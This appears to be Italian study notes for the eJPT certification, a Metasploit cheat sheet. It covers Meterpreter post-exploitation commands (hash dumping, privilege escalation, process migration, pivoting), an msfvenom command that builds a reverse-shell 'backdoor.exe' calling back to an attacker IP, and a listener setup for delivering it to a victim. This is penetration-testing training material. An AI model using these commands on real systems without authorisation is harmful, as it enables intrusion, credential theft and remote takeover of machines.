---
hidden: true
icon: circle-m
---

# Metasploit

```
sysinfo
getuid                                                #forse AUTHORITY\LOCAL SERVICE (dunque no SYSTEM e no high priv)
hashdump                                              #prova a leggere gli hash delle psw (se non leggi continua altrimenti fine)
#Se non funziona usa modulo msf (leggi paragrafo Linux Cred Dumping)
getprivs    # MUST!!                                  #MUST!!  Cerca se hai uno dei tre priv prima elencati

```











## <mark style="color:$primary;">MSF</mark>

### <mark style="color:$primary;">Search modules</mark>

{% hint style="info" %}
Gli auxiliary modules non prevedono l'uso di payload e vengono spesso usati per la parte relativa a port scanning e info gathering.
{% endhint %}

```shell
search <PROTOCOL>                                #xoda, smb, http_server ...
search platform=<OS>                             #windows
search <VULN_NAME>
search type:<TIPO_DI_MODULO> name:<PROTOCOL>         #e.g. type:auxiliary name:ftp
```

### <mark style="color:$primary;">Workspace</mark>

```shell
workspace                                        #Guarda workspace che ci sono
workspace -a <NOME_WORKSPACE>                    #Creane uno
workspace <NOME_WORKSPACE>                       #Cambia workspace
workspace -d <NOME_WORKSPACE>                    #Eliminane uno
```

## <mark style="color:$primary;">Meterpreter (privEsc)</mark>

{% code title="Generale" %}
```shell
sysinfo
getuid
getsystem                                        #Windows
hashdump                                         #Se hai accesso fai il dump 
getprivs

ps
pgrep <PROCESS>
migrate <PID>                                    #Se puoi usa NT AUTHORITY\SYSTEM

run autoroute -s <IP>                            #Dai un IP per accedere alla sub interna
```
{% endcode %}

{% code title="Gestisci file" %}
```shellscript
ls
pwd
getenv PATH
search -f *.<ESTENZIONE>                         #Cerca file con estenzione .xxx
cat <FILE>
?
cd "<FOLDER>"
cd ..
download <FILE>.zip
    CTRL+Z y
    ls
    unzip <FILE>.zip
    #Se dice MD5 hash of /bin/bash torna su meterpreter e...
    checksum md5 /bin/bash
```
{% endcode %}

{% code title="Gestisci sessions" %}
```shellscript
sessions                                         #Guarda le sessioni aperte
sessions <NUMBER>                                #Apri sessione numero N
sessions -n <NAME> -i <NUMBER>                   #Rinomina la sessione numero N
sessions -k <NUMBER>                             #Kill una session
background                                       #Metti in background una sessione
```
{% endcode %}

{% code title="Lancia una shell" %}
```shellscript
shell                                            #Apri shell    
    /bin/bash -i
    systeminfo
    ps
    migrate <NUMBER>
    CTRL+C y
```
{% endcode %}



***

### <mark style="color:$primary;">Shell in Meterpreter (Linux)</mark>

```shell
ifconfig
/bin/bash -i
ps
migrate <NUMBER>
CTRL+C y
```

## <mark style="color:$primary;">MSFVenom</mark>

Msfvenom è un generatore di payload di metasploit

Per eJPT usa:

```shell
windows/meterpreter/reverse_tcp                    #TARGET è x64 (64 bit)
linux/x86/meterpreter/reverse_tcp

windows/meterpreter/bind_tcp                           #TARGET è x86 (32 bit)
linux/meterpreter/bind_tcp

msfvenom --list payloads
#per eJPT usa
```

Per creare una revshell per windows

```shellscript
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP_ATTACKER> LPORT=<PORT_ARBITRARIA> -f exe > 'backdoor.exe'
```

Per inviarlo a victim

{% code title="msf" %}
```shell
sudo python -m SimpleHTTPServer 80
msfconsole -q
use multi/handler                                         #Listener
    set payload windows/meterpreter/reverse_tcp
    set LHOST <IP_ATTACKER>
    set LPORT <PORTA_ARBITRARIA>
    run
    #Lascia ascoltare e vai sulla vittima
```
{% endcode %}

Vai sul browser, salvati la shell e lanciala. Su msf kali dovrebbe partire la revshell.



































